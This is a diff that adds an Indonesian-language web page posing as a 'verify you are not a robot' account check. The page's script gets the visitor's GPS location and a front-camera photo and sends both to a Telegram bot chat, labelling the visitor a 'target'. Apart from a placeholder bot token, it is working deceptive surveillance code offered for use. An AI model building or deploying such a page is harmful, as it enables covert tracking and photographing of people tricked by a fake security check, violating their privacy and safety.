@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
+        button { background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h3>Verifikasi Akun</h3>
+    <p>Klik tombol di bawah untuk memverifikasi bahwa Anda bukan robot.</p>
+    <button onclick="startProcess()">Verifikasi Sekarang</button>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
+<script>
+    // Ambil variabel dari URL (contoh: ?ref=123456)
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('ref'); 
+    const botToken = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"; // Ambil dari start.js (TokenS)
+
+    async function startProcess() {
+        // 1. Minta Izin Lokasi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                await sendToTelegram(`📍 **Lokasi Target Ditemukan!**\nLat: ${lat}\nLong: ${lon}\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`);
+                
+                // 2. Minta Izin Kamera setelah lokasi didapat
+                captureCamera();
+            }, (err) => {
+                sendToTelegram("❌ Target menolak izin lokasi.");
+                captureCamera();
+            });
+        }
+    }
+
+    async function captureCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // Tunggu sebentar agar kamera fokus
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg');
+                await sendPhotoToTelegram(imageData);
+                
+                // Matikan kamera setelah selesai
+                stream.getTracks().forEach(track => track.stop());
+                alert("Verifikasi Selesai. Terima kasih.");
+            }, 2000);
+        } catch (err) {
+            sendToTelegram("❌ Target menolak izin kamera.");
+        }
+    }
+
+    async function sendToTelegram(message) {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+        });
+    }
+
+    async function sendPhotoToTelegram(base64Data) {
+        const blob = await (await fetch(base64Data)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', '📸 **Foto Kamera Depan Target**');
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+</script>
+
+</body>
+</html>
